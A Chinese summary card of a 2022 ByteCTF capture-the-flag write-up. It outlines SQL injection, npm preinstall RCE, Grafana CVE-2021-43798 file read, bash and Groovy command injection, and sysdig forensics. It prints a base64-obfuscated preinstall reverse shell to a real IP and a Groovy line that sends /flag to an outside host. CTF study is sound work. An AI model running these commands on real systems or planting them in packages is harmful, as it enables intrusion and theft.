---
title: "2022 ByteCTF By EDISEC"
category: web
tags: ["ByteCTF 2022", "web", "SQLi-users-signup", "npm-preinstall", "package.json", "dependencies"]
signals: ["ByteCTF 2022 2022", "SQLi-users-signup", "npm-preinstall", "package.json", "dependencies", "Grafana-CVE-2021-43798", "secure-decrypt", "Groovy", "sysdig", "sqli", "rce", "ssrf", "lfi", "ByteCTF"]
difficulty: medium
source: "https://www.ctfiot.com/59101.html"
tools: ["PHP"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 2022 ByteCTF By EDISEC

> 赛事：ByteCTF 2022 2022 | 方向：web | 难度：medium | 工具：PHP

## 一句话总结

ByteCTF 9 大题：SQLi+npm preinstall RCE+Grafana CVE+Groovy+sysdig

## 攻击链

1. Q1 ctf_cloud: SQLi 注册 username/password → 改 connect.sid 拿 admin
2. POST /dashboard/upload package.json + preinstall bash reverse shell
3. POST /dashboard/dependencies 触发 npm install preinstall → RCE
4. Q2 easy_grafana: CVE-2021-43798 任意文件读 /etc/grafana/grafana.ini 拿 secret_key
5. secure.decrypt 解密 admin 密码 → 登录拿 flag
6. Q3 bash_game: arr[$(cat /flag)] bash 数组变量触发命令
7. Q4 easy_groovy: def f = new File(''/flag'').text → URL(''http://ip:1234/''+f).text 出网
8. Q5 signin: /final 抓包爆破队伍名 + id
9. Q6 find_it: sysdig 监控 Ubuntu → 找 findit.txt 找 PHP 异常上传
10. Pwn Bronze Droid: Android setResult 函数 XSS 替换

## 关键 payload

```
preinstall = "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjAuMjYuNTkuMTM3LzIzMzMgMD4mMQ==|base64 -d|bash
```

## 经验教训

npm preinstall script 是供应链攻击面；CVE-2021-43798 Grafana 文件读是经典

## 标签

SQLi-users-signup、npm-preinstall、package.json、dependencies、Grafana-CVE-2021-43798、secure-decrypt、Groovy、sysdig、findit.txt、Android-Droid、XSS、setResult

## 参考来源

- https://www.ctfiot.com/59101.html
- 原文件：2022_ByteCTF_By_EDISEC.full.md
